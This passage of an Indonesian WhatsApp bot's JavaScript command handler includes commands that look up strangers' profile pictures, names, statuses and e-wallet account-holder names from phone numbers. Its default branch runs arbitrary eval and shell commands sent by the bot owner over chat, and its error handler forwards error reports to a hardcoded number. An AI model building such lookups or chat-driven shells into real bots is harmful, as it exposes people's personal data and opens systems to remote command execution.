    return result;
}

    // Hasil konversi
    const hasil = encryptToAksaraJawa(text);

    // Balas hasil enkripsi
    m.reply(`Teks terenkripsi dalam aksara Jawa:\n\n${hasil}`);
    break;
}

case "getpp": {  
    let num = text.trim();  
    if (!num) return m.reply(`Contoh penggunaan: ${prefix}getpp 628xxxxxx atau @tag`);

    // Hapus semua karakter non-digit dari nomor yang dimasukkan  
    num = num.replace(/\D/g, '');

    // Cek apakah nomor diawali dengan kode negara, jika tidak, gunakan default (62 - Indonesia)
    if (!num.startsWith('1') && !num.startsWith('7') && !num.startsWith('2') && !num.startsWith('6')) {
        num = '62' + num;
    }

    // Format nomor dalam bentuk yang dikenali oleh WhatsApp  
    const searchNum = num + '@s.whatsapp.net';

    // Cek apakah nomor terdaftar di WhatsApp  
    const isExist = await Nvidia.onWhatsApp(searchNum);
    if (!isExist[0]?.exists) {  
        return m.reply('Nomor ini tidak terdaftar di WhatsApp.');
    }  

    // Ambil gambar profil, jika tidak ada gunakan gambar default  
    let img = await Nvidia.profilePictureUrl(searchNum, 'image').catch(_ => 'https://btch.pages.dev/file/70e8de9b1879568954f09.jpg');

    // Kirim foto profil dengan caption  
    await Nvidia.sendMessage(m.chat, {  
        image: { url: img },  
        caption: `📸 *Profile Picture*\n📞 *Nomor:* wa.me/${num}`
    }, { quoted: m });

break;  
}

case "cekid": {
    try {
        // Ambil nomor HP setelah command
        const input = m.text.split(" ")[1];
        if (!input) {
            return m.reply("📌 *Format Salah!*\nGunakan format: `.cekid no_hp`\n\nSetelah itu pilih layanan dari daftar.");
        }

        // List layanan eWallet yang tersedia
        const layananList = [
            { title: "💰 GoPay", id: `.prosescekid gopay|${input}` },
            { title: "💰 Dana", id: `.prosescekid dana|${input}` },
            { title: "💰 ShopeePay", id: `.prosescekid shopeepay|${input}` },
            { title: "💰 OVO", id: `.prosescekid ovo|${input}` },
            { title: "💰 GrabPay", id: `.prosescekid grab|${input}` },
            { title: "💰 iSaku", id: `.prosescekid isaku|${input}` },
            { title: "💰 LinkAja", id: `.prosescekid linkaja|${input}` }
        ];

        let sections = [{
            title: "🔹 Pilih Layanan eWallet",
            highlight_label: "📌 Klik untuk memilih",
            rows: layananList
        }];

        // Kirim button list ke pengguna
        await Nvidia.sendMessage(m.chat, {
            buttons: [
                {
                    buttonId: 'pilih-ewallet',
                    buttonText: { displayText: '💰 Pilih Layanan eWallet' },
                    type: 4,
                    nativeFlowInfo: {
                        name: 'single_select',
                        paramsJson: JSON.stringify({ title: "💰 Pilih eWallet", sections })
                    }
                }
            ],
            footer: `📌 Bot By ${botname}`,
            headerType: 1,
            viewOnce: true,
            text: `📌 *Cek ID eWallet*\nMasukkan nomor HP, lalu pilih layanan yang ingin dicek.`
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        m.reply("⚠️ Terjadi kesalahan saat memproses permintaan.");
    }
}
break;

case "prosescekid": {
    try {
        if (!text.includes("|")) return m.reply("⚠️ Format salah! Gunakan format: `.prosescekid layanan|no_hp`");

        const [custom, hp] = text.split("|");

        // Validasi layanan eWallet
        const validCustoms = ["gopay", "dana", "shopeepay", "ovo", "grab", "isaku", "linkaja"];
        if (!validCustoms.includes(custom.toLowerCase())) {
            return m.reply("⚠️ Pilihan tidak valid! Gunakan salah satu dari: gopay, dana, shopeepay, ovo, grab, isaku, linkaja.");
        }

        // Request ke API payday.my.id
        const url = `https://payday.my.id/trueid/ewallet/${custom}/?hp=${hp}&key=${global.apiAkses}`;
        const result = await axios.get(url);
        const data = result.data;

        // Tangani respons API
        if (data.result && data.result.status === 200) {
            return m.reply(`✅ *Berhasil Cek ID*\n\n📌 *Layanan:* ${custom.toUpperCase()}\n📌 *Nomor HP:* ${hp}\n📌 *Nama:* ${data.name}`);
        } else if (data.result && data.result.status === 400) {
            return m.reply(`❌ *Gagal Cek ID*\n\n📌 *Layanan:* ${custom.toUpperCase()}\n📌 *Nomor HP:* ${hp}\n📌 *Status:* Gagal\n📌 *Keterangan:* ${data.error_msg}`);
        } else {
            return m.reply("⚠️ Respons API tidak valid.");
        }
    } catch (error) {
        console.error(error);
        m.reply("⚠️ Terjadi kesalahan saat memproses permintaan.");
    }
}
break;

  case "cekgrub": {
    if (!m.isGroup) return reply("❌ Fitur ini hanya untuk grup!");

    // Ambil data grup (contoh diambil dari socket/conn/bot API Anda)
    let metadata = await Nvidia.groupMetadata(from); // misalnya pakai Baileys
    let adminList = metadata.participants.filter(p => p.admin !== null);
    let adminCount = adminList.length;
    let memberCount = metadata.size;

    // Data yang disesuaikan dengan format Anda
    let dataGroup = {
      name: metadata.subject,
      id: metadata.id,
      created_at: metadata.creation, // timestamp dalam detik
      created_by: metadata.owner || "Tidak diketahui",
      description: metadata.desc,
      chat_pic: await Nvidia.profilePictureUrl(from, "image").catch(_ => null),
      name_at: metadata.subjectTime // timestamp update nama grup
    };

    // Format hasil
    let hasil = `📛 *Nama:* ${dataGroup.name || "Tidak diketahui"}\n`;
    hasil += `🆔 *ID:* ${dataGroup.id || "Tidak diketahui"}\n`;
    hasil += `📅 *Dibuat Pada:* ${dataGroup.created_at ? new Date(dataGroup.created_at * 1000).toLocaleString() : "Tidak diketahui"}\n`;
    hasil += `👤 *Dibuat Oleh:* ${dataGroup.created_by || "Tidak diketahui"}\n`;
    hasil += `📖 *Deskripsi:* \n${dataGroup.description || "Tidak ada deskripsi"}\n`;
    hasil += `🖼 *Foto Grup:* ${dataGroup.chat_pic ? dataGroup.chat_pic : "Tidak tersedia"}\n`;
    hasil += `👑 *Jumlah Admin:* ${adminCount}\n`;
    hasil += `👥 *Jumlah Member:* ${memberCount}\n`;
    hasil += `🔄 *Update Nama Terakhir:* ${dataGroup.name_at ? new Date(dataGroup.name_at * 1000).toLocaleString() : "Tidak diketahui"}\n`;

    reply(hasil);
  }
  break;

case "asupan": {
    // Kirim reaksi sebagai tanda sedang memproses
    await Nvidia.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    // Endpoint Web API
    const apiUrl = "https://api.agatz.xyz/api/asupan";

    try {
        const response = await axios.get(apiUrl);
        const apiData = response.data;

        // Validasi respons API
        if (!apiData || apiData.status !== 200 || !apiData.data) {
            return m.reply("❌ Error! Tidak dapat mengambil video asupan.");
        }

        const videoUrl = apiData.data;

        // Mengirim video langsung tanpa caption
        await Nvidia.sendMessage(m.chat, { video: { url: videoUrl } }, { quoted: m });

    } catch (error) {
        console.error(error);
        m.reply("❌ Error! Terjadi kesalahan saat mengambil video.");
    }
}
break;

case "carinomor": case "ceknomor": {
  const nomorList = (q || args.join(' ')).split('|').map(n => n.replace(/[^0-9]/g, '')).filter(n => n);
  if (!nomorList.length) {
    await Nvidia.sendMessage(m.chat, { text: '⚠️ Masukkan nomor! Contoh:\n.carinomor 628xxx|628xxx' }, { quoted: m });
    return;
  }

  for (const nomor of nomorList) {
    const jid = nomor + '@s.whatsapp.net';
    const profile = await Nvidia.profilePictureUrl(jid, 'image').catch(_ => 'https://telegra.ph/file/1c734de795f9e4a9f66c9.jpg');
    const { status, name } = await Nvidia.fetchStatus(jid).catch(_ => ({ status: 'Tidak tersedia', name: 'Tidak tersedia' }));

    const caption = `👤 *Nama:* ${name || 'Tidak tersedia'}\n📞 *Nomor:* ${nomor}\n📝 *Status:* ${status || 'Tidak tersedia'}\n\nKlik tombol "Hubungi Nomor" di bawah ini!`;

    const button = [{
      buttonId: `.hubungi ${nomor}`,
      buttonText: { displayText: '📞 Hubungi Nomor' },
      type: 1
    }];

    const templateMessage = {
      image: { url: profile },
      caption,
      footer: 'FR3 DEV',
      buttons: button,
      headerType: 4
    };

    await Nvidia.sendMessage(m.chat, templateMessage, { quoted: m });
  }

  break;
}

case "hubungi": {
  if (!text) return m.reply('⚠️ Masukkan nomor yang mau dihubungi!\nContoh: .hubungi 628xxx');
  
  const nomor = text.replace(/[^0-9]/g, '');
  if (!nomor) return m.reply('⚠️ Nomor tidak valid!');
  
  const linkWa = `https://wa.me/${nomor}`;
  const caption = `📞 *Nomor:* ${nomor}\n🔗 *Link WhatsApp:* ${linkWa}\n\nKlik link di atas untuk langsung chat nomor tersebut!`;
  
  await Nvidia.sendMessage(m.chat, { text: caption }, { quoted: m });
  break;
}

case "self": {
if (!isCreator) return
Nvidia.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

case "public": {
if (!isCreator) return
Nvidia.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

case "tofile": {
  if (!m.quoted && !text && !m.mimetype)
    return m.reply("❌ Kirim teks, reply media, atau sertakan file + caption `.tofile`.");

  let buffer, fileNameSuggestion = "file";

  if (text) {
    buffer = Buffer.from(text, "utf-8");
    fileNameSuggestion = "text";
  } else if (m.quoted && m.quoted.mimetype) {
    const quotedFile = await m.quoted.download();
    if (!quotedFile) return m.reply("❌ Gagal unduh file.");
    buffer = quotedFile;
    fileNameSuggestion = m.quoted.filename?.split(".")[0] || "file";
  } else if (m.mimetype) {
    const file = await m.download();
    if (!file) return m.reply("❌ Gagal unduh file.");
    buffer = file;
    fileNameSuggestion = m.filename?.split(".")[0] || "file";
  }

  tofileBufferMap.set(m.sender, {
    buffer: buffer,
    name: fileNameSuggestion
  });

  const formats = ["txt", "js", "html", "md", "pdf", "py", "php", "json", "xml", "csv", "java", "cpp"];
  const rows = formats.map(format => ({
    buttonId: `.tofileconfirm ${fileNameSuggestion} ${format}`,
    buttonText: { displayText: `.${format}` },
    type: 1
  }));

  const buttonMessage = {
    text: "📝 Pilih format file yang ingin kamu buat:",
    footer: "©FR3 DEV",
    buttons: rows,
    headerType: 1
  };

  return await Nvidia.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

case "tofileconfirm": {
  if (!text.includes(" ")) return m.reply("❌ Format tidak valid. Gunakan tombol.");

  const [name, ext] = text.split(" ");
  const data = tofileBufferMap.get(m.sender);

  if (!data) return m.reply("❌ Tidak ada data siap diubah. Gunakan `.tofile` dulu.");

  const fileName = `${name}.${ext}`;
  const buffer = data.buffer;

  tofileBufferMap.delete(m.sender); // Hapus setelah digunakan

  await Nvidia.sendMessage(m.chat, {
    document: buffer,
    fileName: fileName,
    mimetype: "application/octet-stream"
  }, { quoted: m });
}
break;

case "timezone": {
  const allZones = moment.tz.names(); // Semua zona waktu
  const maxRowsPerSection = 100;
  const maxSections = 10;

  // Bagi jadi beberapa sections
  const sections = [];
  for (let i = 0; i < Math.min(allZones.length, maxRowsPerSection * maxSections); i += maxRowsPerSection) {
    const chunk = allZones.slice(i, i + maxRowsPerSection);
    sections.push({
      title: `🌍 Zona Waktu Bagian ${sections.length + 1}`,
      highlight_label: "🌐 Pilih Zona",
      rows: chunk.map(z => ({
        title: z,
        id: `.timezoneresult ${z}`
      }))
    });
  }

  const pesan = `╭─── 〔 *🌐 TIMEZONE* 〕 ───╮
📌 Total Zona: ${allZones.length}
📥 Pilih zona dari daftar berikut.
📍 Kompatibel Grup dan Privat!
╰────────────────────────╯`;

  await Nvidia.sendMessage(m.chat, {
    buttons: [
      {
        buttonId: 'pilih-zona',
        buttonText: { displayText: '🌐 Pilih Zona Waktu' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: "🌍 Pilih Zona Waktu",
            sections
          })
        }
      }
    ],
    text: pesan,
    footer: "© FR3 DEV",
    headerType: 1,
    viewOnce: true
  }, { quoted: m });
}
break;

case "timezoneresult": {
  if (!text) return m.reply("❌ Zona tidak ditemukan!");

  try {
    const now = moment().tz(text);
    const waktu = now.format("HH:mm:ss");
    const tanggal = now.format("dddd, D MMMM YYYY");
    const offset = now.format("Z");

    return m.reply(`🕓 Zona Waktu: *${text}*\n📅 ${tanggal}\n⏰ ${waktu} (GMT${offset})`);
  } catch {
    return m.reply("⚠️ Zona waktu tidak valid.");
  }
}
break;

case "upgithub": {
  const path = require("path");
  const fs = require("fs");
  const uploadToGithub = require("./uploadGithub");

  if (!m.quoted || !m.quoted.message || !m.quoted.message.documentMessage) {
    return m.reply("❌ Reply file .zip dengan perintah:\n.upgithub nama-repo");
  }

  const repoName = text.trim();
  if (!repoName) return m.reply("Masukkan nama repository. Contoh: .upgithub portofolio-website");

  const tempDir = path.join(__dirname, "temp");
  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);

  const filePath = path.join(tempDir, `${Date.now()}.zip`);
  const stream = await downloadMediaMessage(m.quoted);
  const buffer = await streamToBuffer(stream);
  fs.writeFileSync(filePath, buffer);

  m.reply(`⏳ Upload ke GitHub: *${repoName}*`);

  try {
    const link = await uploadToGithub(filePath, repoName);
    m.reply(`✅ Berhasil upload!\n🔗 ${link}`);

    fs.unlinkSync(filePath);
    const extractPath = path.join(tempDir, repoName);
    if (fs.existsSync(extractPath)) {
      fs.rmSync(extractPath, { recursive: true, force: true });
    }
  } catch (e) {
    console.error(e);
    m.reply(`❌ Gagal upload:\n${e.message}`);
  }
}
break;
  
default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

if (!m.key.fromMe && !m.text.startsWith('.') && isAutoAI) {
  autoResponderAI(m.text, m, Nvidia);
}

if (m.text.toLowerCase() == "bot") {
m.reply("Online ✅")
}


if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}


if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}


}
} catch (err) {
console.log(util.format(err));
Nvidia.sendMessage("62882008771871@s.whatsapp.net", {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}



let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}\n ©FR3 DEV`))
	delete require.cache[file]
	require(file)
});